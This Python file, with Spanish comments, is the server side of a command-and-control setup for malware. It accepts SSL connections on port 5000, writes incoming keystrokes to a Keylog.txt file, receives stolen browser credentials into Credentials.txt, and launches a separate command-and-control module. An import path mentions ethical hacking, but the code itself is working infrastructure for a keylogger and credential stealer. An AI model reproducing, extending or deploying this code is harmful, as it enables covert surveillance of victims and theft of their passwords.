import os
import socket
import threading
from pathlib import Path
import cmd_cntr
import recv_cred
import ssl
import colorama
from colorama import Fore
import certs
import tempfile
# from ETHICAL_HACKING.cryptography.CryptoPhenix import encrypt, decrypt

# Conexion de keylog
# C&C
# Navegadores
# Conexiones cifradas mediante certificado SSL


cert = tempfile.NamedTemporaryFile(delete=False)
cert.write(certs.get_crte().encode())
cert.close()

key = tempfile.NamedTemporaryFile(delete=False)
key.write(certs.get_locker().encode())
key.close()


def banner():
    colorama.init()
    print(Fore.GREEN + "\n\n\t[!] STARTED C&C SERVER\n\t" + Fore.RESET)


def conn_1():
    # Lista vacia de letras
    keys = []

    # Definimos location y nombre del archivo
    location = get_user_path() + "Desktop/"
    filename = "Keylog.txt"

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.check_hostname = False

    # Add the certificate and private key to the context.
    context.load_cert_chain(certfile=cert.name, keyfile=key.name)

    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks.bind(('0.0.0.0', 5000))
    socks.listen(1)
    print(Fore.CYAN + "|[!] Listening on 5000|")

    # Aceptamos conexiones entrantes...
    conn, addr = socks.accept()
    print(Fore.CYAN + f"[!] Connection on port 5000...\t{addr} ")
    secure_conn = context.wrap_socket(conn, server_side=True)

    while True:
        msg = recv_out(secure_conn).decode()
        keys.append(msg)

        write_file(msg, location, filename)


def get_user_path():
    return "{}/".format(Path.home())


def recv_out(secure_conn):

    while True:
        output = secure_conn.recv(4096)
        return output


def get_credentials(secure_conn_1):
    location = get_user_path() + "Desktop/"
    filename = "Credentials.txt"

    # Recibimos las credenciales del navegador
    while True:
        cred = secure_conn_1.recv(4096)
        write_file(cred.decode(), location, filename)


def main():
    banner()

    # Hilo 1 de keylogs
    thread_1 = threading.Thread(target=conn_1)
    thread_1.start()

    # Hilo 3 de credenciales de navegadores
    thread_2 = threading.Thread(target=recv_cred.main())
    thread_2.start()

    # Hilo 2 comand & control
    thread_3 = threading.Thread(target=cmd_cntr.start())
    thread_3.start()

    # Juntamos los hilos para su posterior detención.
    thread_2.join()
    thread_1.join()
    thread_3.join()


def write_file(text, location, filename):

    # Archivo a crear
    with open(location + filename, "a", encoding="utf-8") as log:
        log.write(text)


if __name__ == "__main__":
    main()
    os.unlink(cert.name)
    os.unlink(key.name)
